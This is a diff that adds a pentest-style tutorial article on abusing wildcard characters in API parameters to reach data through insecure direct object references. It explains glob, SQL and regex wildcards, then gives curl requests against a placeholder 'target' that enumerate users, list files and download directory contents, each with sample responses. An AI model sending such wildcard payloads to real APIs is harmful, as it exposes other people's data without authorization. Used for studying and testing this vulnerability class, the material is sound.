@@ -1,0 +1,144 @@
+---
+title: Wildcard Parameter Exploitation in APIs
+description: Learn how wildcard parameters in APIs can lead to insecure direct object
+  references, exposing unauthorized data.
+keywords:
+- Wildcard Parameters
+- Insecure Direct Object References
+- APIs
+- Unauthorized Data Exposure
+- Wildcard Enumeration
+- Glob Patterns
+- SQL Wildcards
+- Directory Traversal
+---
+
+# Wildcard Parameter
+
+## Context
+
+This article delves into the exploitation of insecure direct object references (IDOR) via wildcard parameters in web applications and APIs. To fully grasp the concepts and techniques discussed here, familiarity with HTTP methods, REST API endpoints, and standard authorization mechanisms is assumed.
+
+## Theory
+
+### Wildcard Parameters in Web Applications
+
+Wildcard parameters are input elements in web applications or APIs that can accept wildcard characters, such as *, %, or ?. These are used to match multiple resources in a single query. While intended for functionalities like batch processing or broad searches, they can inadvertently lead to vulnerabilities when improperly validated, giving attackers a way to broaden access to large data sets in a single request.
+
+APIs often interpret such wildcards as instructions to enumerate or return multiple objects. For example, an endpoint designed to retrieve a single user resource might instead list all users if a wildcard is provided. This can result in unauthorized data access or exposure and is a prime target when mapping IDOR attack surfaces.
+
+### Attack Surface: Wildcard Enumeration and Unauthorized List Exposure
+
+The attack typically begins when an attacker submits a wildcard parameter to an endpoint expecting a specific object ID. If the server interprets this parameter as a request to access multiple or all objects, it may respond by returning significant amounts of sensitive data.
+
+This vulnerability is often magnified by a lack of per-object authorization checks when handling wildcard or glob patterns. Without these controls, the application might not appropriately restrict access to resources based on user permissions.
+
+### Common Wildcard Patterns and Bypass Techniques
+
+Various wildcard patterns can be exploited in applications:
+
+- **Glob Wildcards:** Characters like *, ?, or ranges [a-z] are used.
+- **SQL Wildcards:** Characters such as %, which matches any string of zero or more characters, and _, which matches a single character.
+- **Regex Wildcards:** Patterns like .*, which matches any character sequence.
+
+APIs accepting these patterns in path or query parameters might unintentionally allow users to bypass intended access controls. Endpoints utilizing filesystem or database globbing may fail to correctly process user-supplied wildcards, leading to potential data exposure.
+
+## Practice
+
+### Wildcard Parameter Enumeration via REST API
+
+To enumerate users through an API utilizing wildcard parameters, perform the following steps:
+
+- **Step 1: Submit Request with Wildcard**
+
+    Use `curl` to send a GET request to an API endpoint, incorporating a wildcard in the object ID:
+
+    ```bash
+    curl -i -X GET 'https://target/api/users/*'
+    ```
+
+    This attempts to enumerate all users by using a wildcard instead of a specific ID.
+
+- **Step 2: Analyze Response**
+
+    The server responds similarly to:
+
+    ```text
+    HTTP/1.1 200 OK
+    [
+      {"id":1,"username":"admin"},
+      {"id":2,"username":"user1"},
+      ...
+    ]
+    ```
+
+    This response indicates that the wildcard was expanded and multiple user objects were returned.
+
+**Outcome:** By exploiting this wildcard enumeration, an attacker gains unauthorized access to multiple user records.
+
+### Wildcard Parameter Bypass Using SQL Wildcards
+
+To exploit SQL wildcards in a query parameter:
+
+- **Step 1: Submit Query with SQL Wildcard**
+
+    Access an API endpoint with a SQL wildcard to retrieve files:
+
+    ```bash
+    curl -i -X GET 'https://target/api/files?id=%'
+    ```
+
+    The use of % attempts to retrieve all files from the database endpoint.
+
+- **Step 2: Analyze Response**
+
+    The server's response:
+
+    ```text
+    HTTP/1.1 200 OK
+    [
+      {"id":101,"filename":"secret.pdf"},
+      {"id":102,"filename":"report.docx"},
+      ...
+    ]
+    ```
+
+    This confirms that the API treated the % as a request to return all matching file objects.
+
+**Outcome:** Using a SQL wildcard, an attacker can retrieve unauthorized files.
+
+### Wildcard Directory Traversal via Path Parameter
+
+For directory traversal using a wildcard path:
+
+- **Step 1: Use Directory Wildcard**
+
+    Initiate a GET request targeting an API meant for file downloads, appending a wildcard:
+
+    ```bash
+    curl -i -X GET 'https://target/api/download/*'
+    ```
+
+    This attempts to download all files within the specified directory path.
+
+- **Step 2: Analyze Response**
+
+    Expected server response:
+
+    ```text
+    HTTP/1.1 200 OK
+    [
+      {"filename":"config.yml"},
+      {"filename":"db.sqlite"},
+      ...
+    ]
+    ```
+
+    The wildcard expanded to multiple files within the directory.
+
+**Outcome:** An attacker can download multiple files without proper authorization using directory wildcard traversal.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
